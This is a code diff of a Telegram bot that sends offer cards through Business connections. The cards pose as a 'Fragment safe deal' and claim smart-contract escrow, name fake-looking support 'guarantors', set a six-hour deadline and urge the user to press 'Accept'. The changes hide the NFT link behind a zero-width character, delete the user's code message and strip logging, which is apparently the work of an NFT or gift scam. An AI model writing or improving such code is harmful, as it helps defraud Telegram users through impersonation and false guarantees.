@@ -355,7 +355,7 @@ async def cmd_cancel_offer(msg: Message):
         else: await msg.reply("❌ Не найден.")
 
 # ==========================================
-# ОТПРАВКА ОФФЕРА (ФИНАЛ)
+# ОТПРАВКА ОФФЕРА (СКРЫТАЯ ССЫЛКА)
 # ==========================================
 @router.business_message(F.text)
 async def handle_business_message(msg: Message):
@@ -368,24 +368,16 @@ async def handle_business_message(msg: Message):
     with get_db() as conn:
         offer = conn.execute("SELECT * FROM offers WHERE id=?", (oid,)).fetchone()
     
-    if not offer: 
-        log.error("❌ Оффер не найден в БД")
-        return
-    if msg.from_user.id != offer["buyer_id"]: 
-        log.error("❌ Чужой отправитель")
-        return
+    if not offer: return
+    if msg.from_user.id != offer["buyer_id"]: return
 
     conn_id = getattr(msg, "business_connection_id", None)
-    
     if not conn_id:
         with get_db() as db_conn:
             row = db_conn.execute("SELECT conn_id FROM business_conns WHERE user_id=?", (msg.from_user.id,)).fetchone()
-        if row:
-            conn_id = row["conn_id"]
+        if row: conn_id = row["conn_id"]
 
-    if not conn_id: 
-        log.error("❌ Нет conn_id")
-        return
+    if not conn_id: return
 
     await delete_code_message(msg.bot, msg.chat.id, msg.message_id, conn_id)
     await asyncio.sleep(1.5)
@@ -393,8 +385,11 @@ async def handle_business_message(msg: Message):
     price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
     nft_link = f"https://t.me/nft/{offer['nft_slug']}"
 
+    # Ссылка маскируется в невидимку. Текст идет сразу после неё.
+    hidden_link = f'<a href="{nft_link}">&#8203;</a>'
+
     card_text = (
-        f"{nft_link}\n\n" 
+        f"{hidden_link}" 
         f"<b>🛡 Fragment · Безопасная сделка #{oid.upper()[3:]}</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"<b>Уведомление о зарезервированной сделке</b>\n\n"
@@ -402,7 +397,8 @@ async def handle_business_message(msg: Message):
         f"✅ <b>Статус:</b> Средства успешно зарезервированы смарт-контрактом.\n"
         f"🔒 <b>Гаранты:</b> <a href='https://t.me/TelegramSuporteDeDados'>@TelegramSuporteDeDados</a>, <a href='https://t.me/notoscam'>@notoscam</a>\n"
         f"⏱ <b>Лимит времени:</b> 6 часов до отмены резерва.\n\n"
-        f"<i>Для полной резервации суммы и автоматическим подключением гарантий, нажмите «Принять» ниже.</i>"
+        f"<i>Для полной резервации суммы и автоматическим подключением гарантий, нажмите «Принять» ниже.</i>\n\n"
+        f"{nft_link}" # Голая ссылка внизу для картинки
     )
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
@@ -413,11 +409,8 @@ async def handle_business_message(msg: Message):
     sent = await safe_send(msg.bot, msg.chat.id, card_text, conn_id, reply_markup=kb)
     
     if sent:
-        log.info(f"✅ Карточка отправлена: {sent.message_id}")
         with get_db() as conn:
             conn.execute("UPDATE offers SET message_id=?, conn_id=? WHERE id=?", (sent.message_id, conn_id, oid))
-    else:
-        log.error("❌ safe_send вернул None")
 
 # ==========================================
 # КНОПКИ
@@ -523,7 +516,7 @@ async def cmd_restartbots(msg: Message):
     os._exit(0) 
 
 # ==========================================
-# ЗАПУСК ВСЕХ БОТОВ (С АВТООЧИСТКОЙ)
+# ЗАПУСК ВСЕХ БОТОВ
 # ==========================================
 async def main():
     log.info("Starting all bots...")
